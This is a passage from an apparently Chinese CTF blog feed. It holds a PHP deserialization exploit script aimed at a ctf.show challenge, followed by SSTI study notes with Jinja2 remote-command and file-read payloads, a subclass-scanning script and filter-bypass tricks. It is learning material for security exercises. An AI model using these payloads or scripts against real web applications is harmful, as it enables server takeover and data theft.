php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$a</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cycycycy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;</span><br><br></code></pre></td></tr></table></figure><p>之后用脚本爆破key就可以了，贴一个官方的脚本 <strong>没懂</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>mi = [<span class="hljs-string">&#x27;i6xstx6d6x6ir&#x27;</span>,<span class="hljs-string">&#x27;u5zarz5s5z5ue&#x27;</span>,<span class="hljs-string">&#x27;y4lpel4a4l4yw&#x27;</span>,<span class="hljs-string">&#x27;sqnhonqjqnqsi&#x27;</span>,<span class="hljs-string">&#x27;dwmjpmwkwmwdo&#x27;</span>,<span class="hljs-string">&#x27;fe1ka1ele1efp&#x27;</span>]<br>d = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> d&lt;<span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> mi:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;eval&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;cat /f1agaaa&quot;);&#x27;</span><br>        &#125;<br>        url = <span class="hljs-string">f&quot;http://67423f19-3ba4-41b5-9e10-716ce8f5e683.challenge.ctf.show/index.php?get=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        header = &#123;<br>            <span class="hljs-string">&#x27;aaaaaa&#x27;</span>:<span class="hljs-string">&#x27;O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;&#x27;</span><br>        &#125;<br>        reqpose = requests.post(url=url,data=data,headers=header).text<br>        re_text = re.findall(<span class="hljs-string">r&quot;(?&lt;=&lt;/code&gt;).*&quot;</span>, reqpose, re.S)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> re_text:<br>            <span class="hljs-built_in">print</span>(re_text[<span class="hljs-number">0</span>])<br>            d += <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>php原生类</tag>
      
      <tag>flask加密伪造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Djingo_ssti</title>
    <link href="/tuyi/2025/01/19/Djingo_ssti/"/>
    <url>/tuyi/2025/01/19/Djingo_ssti/</url>
    
    <content type="html"><![CDATA[<p>一点关于ssti的学习笔记以 Djingo为例 当然不仅仅只有python的ssti 其他语言也有，甚至Rust都有</p><p>不会就试试<strong>fenjing一把梭哈</strong></p><h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、任意命令执行<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>、任意命令执行<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//这个<span class="hljs-number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload<br><span class="hljs-number">3</span>、任意命令执行<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>、任意命令执行<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">5</span>、任意命令执行<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>、文件读取<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">7.</span>任意命令执行<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>不出网写静态文件<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>当config是<span class="hljs-literal">None</span>时，尝试读取current_app的config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure><h1 id="常见的内置方法"><a href="#常见的内置方法" class="headerlink" title="常见的内置方法"></a>常见的内置方法</h1><ul><li>__class__返回对象对应的类</li><li>__module__返回对应类对应的模块</li><li>__bases__返回类所有的父类</li><li>__base__返回类的基类</li><li>__name__返回类名</li><li>__mro__返回解析方法调用类的顺序的元组</li><li>_<em>subclasses</em>_()可以举所有在内存中存在的类 注意他是一个函数</li><li>__init__重新加载类的属性</li><li>__globals__会以字典的形式返回当前位置的全部全局变量</li></ul><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><p>获取键值或下标的方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>获取属性的方式</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。<br>&#123;&#123;&#125;&#125;用于将表达式打印到模板输出<br>&#123;##&#125;表示未包含在模板输出中的注释<br>\##可以有和&#123;%%&#125;相同的效果<br></code></pre></td></tr></table></figure>{%set%}拼接<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">c.构造popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(po=a,pen=a)|<span class="hljs-name">join</span>%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="1-什么是SSTI模板注入"><a href="#1-什么是SSTI模板注入" class="headerlink" title="1.什么是SSTI模板注入"></a>1.什么是SSTI模板注入</h1><p>SSTI，服务端模板注入，其实也就是模板引擎+注入, 那么我们首先需要了解一下模板引擎</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。也就是html框架</p><p>常见的模板引擎：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">PHP:</span> Smarty, Twig, <span class="hljs-keyword">Blade</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java: </span><span class="hljs-keyword">JSP, </span>FreeMarker, Velocity<br><span class="hljs-symbol">Python:</span> <span class="hljs-keyword">Jinja2, </span>django, tornado<br></code></pre></td></tr></table></figure><p>简单的ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">  &lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="hljs-string">  &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>% (name)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>当我们输入name是可控的,使用的是%S来实现动态的字符串控制，而Flask使用的是jinja2模板，我们可以传入{{}}，`{{}}`在`Jinja2`中作为变量包裹标识符，`Jinja2`在渲染的时候会把{{}}包裹的内容进行解析，就可以执行命令。<h1 id="2-SSTI前置知识"><a href="#2-SSTI前置知识" class="headerlink" title="2.SSTI前置知识"></a>2.SSTI前置知识</h1><p>主要了解一点Python的魔术方法和内置类</p><p><code>__class__</code>用于返回该对象所属的类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;abcd&#x27;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__base__</code>用于获取类的基类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__base__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br>//<span class="hljs-built_in">object</span>为<span class="hljs-built_in">str</span>的基类<br></code></pre></td></tr></table></figure><p><code>__mro__</code>返回解析方法调用的顺序的元组。（当调用_mro_[1]或者-1时作用其实等同于_base_）<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__subclasses__()</code>可以获取类的所有子类的元组<br>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;,&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;...]<br></code></pre></td></tr></table></figure><p><code>__init__</code><br>重载子类，获取子类初始化的属性。</p><p><code>__globals__</code><br>函数会以字典的形式返回当前位置的全部全局变量<br>就比如：<code>os._wrap_close.__init__.__globals__</code>，可以获取到os中的一些函数，进行文件读取</p><h1 id="3-SSTI语句构造"><a href="#3-SSTI语句构造" class="headerlink" title="3.SSTI语句构造"></a>3.SSTI语句构造</h1><p>第一步，拿到当前类，也就是用__class__</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br></code></pre></td></tr></table></figure><p>第二步，拿到基类，这里可以用__base__，也可以用__mro__</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[1]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>第三步，拿到基类的子类，用<code>__subclasses__()</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()&#125;&#125;<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, <br></code></pre></td></tr></table></figure><p>接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类<br>大多数利用的是<code>os._wrap_close</code>这个类，我们这里可以用一个简单脚本来寻找它对应的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?name=\</span><br><span class="hljs-string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>    res = requests.get(url=url, headers=headers)<br>    <span class="hljs-comment">#print(res.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它<br>首先<br>先调用它的__init__方法进行初始化类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__&#125;&#125;<br></code></pre></td></tr></table></figure><p>此时就可以去进行RCE了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE<br>它的payload是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="4-SSTI常见的绕过方式"><a href="#4-SSTI常见的绕过方式" class="headerlink" title="4.SSTI常见的绕过方式"></a>4.SSTI常见的绕过方式</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过  ."></a>绕过  .</h2><p>当.被ban时，有以下几种绕过方式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1、用[]代替.</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、用attr()过滤器绕过</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过 _"></a>绕过 _</h2><p>当<code>_</code>被ban时，有以下几种绕过方式</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1、通过list获取字符列表，然后用pop来获取_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、可以通过字符编码的方式进行绕过，举个16进制编码例子 可以编码绕过 python解析器支持 hex ，unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure>使用{%set%}构造下划线<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 